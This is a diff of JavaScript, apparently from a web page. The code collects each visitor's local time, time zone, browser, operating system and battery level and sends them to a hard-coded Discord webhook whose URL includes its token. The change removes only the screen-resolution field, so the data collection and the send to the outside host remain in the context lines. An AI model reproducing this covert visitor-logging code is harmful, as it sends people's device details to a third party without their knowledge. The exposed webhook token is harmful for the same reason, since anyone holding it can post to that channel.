@@ -33,7 +33,6 @@
             var webhookUrl = "https://discord.com/api/webhooks/1204803439243042868/s6Nz2rSCmi8B0RiWNKP4VNeVoERzZZPsadmwLU12tpcrryj_aPKgt_KHokHEcf9izqaU";
             var currentTime = new Date().toLocaleTimeString();
             var browserInfo = getBrowserName();
-            var screenInfo = getScreenResolution();
             var osInfo = getOperatingSystem();
             var batteryPercentage = 0;
 
@@ -51,7 +50,6 @@
                         { name: "Current Time ⏰", value: currentTime },
                         { name: "Time Zone ⌚", value: Intl.DateTimeFormat().resolvedOptions().timeZone },
                         { name: "Browser 🔎", value: browserInfo },
-                        { name: "Screen Resolution 🖥️", value: screenInfo },
                         { name: "Operating System 🖥️", value: osInfo },
                         { name: "Battery Percentage 🔋", value: batteryPercentage + "%" }
                     ]
@@ -90,12 +88,6 @@
             } else {
                 return "Unknown";
             }
-        }
-
-        function getScreenResolution() {
-            var screenWidth = window.screen.width;
-            var screenHeight = window.screen.height;
-            return screenWidth + "x" + screenHeight;
         }
 
         function getOperatingSystem() {
